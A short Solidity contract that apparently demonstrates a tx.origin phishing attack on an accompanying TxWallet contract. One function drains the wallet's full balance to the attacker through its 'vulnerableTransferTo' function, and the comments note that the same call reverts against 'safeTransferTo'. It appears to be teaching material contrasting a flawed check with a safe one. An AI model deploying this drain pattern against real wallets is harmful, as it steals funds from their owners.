// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.8.0;
import "./TxWallet.sol";

contract MaliciousContract {
    TxWallet private _wallet;
    address payable private _attackerAccount;

    constructor(address payable txWallet) public {
        _wallet = TxWallet(txWallet);
        _attackerAccount = msg.sender;
    }

    // It works!!
    function stealEthersFromVulnerableFunction() public {
        _wallet.vulnerableTransferTo(_attackerAccount, address(_wallet).balance);
    }

    // it reverts!!
    function stealEthersFromSafeSafeFunction() public {
        _wallet.safeTransferTo(_attackerAccount, address(_wallet).balance);
    }
}
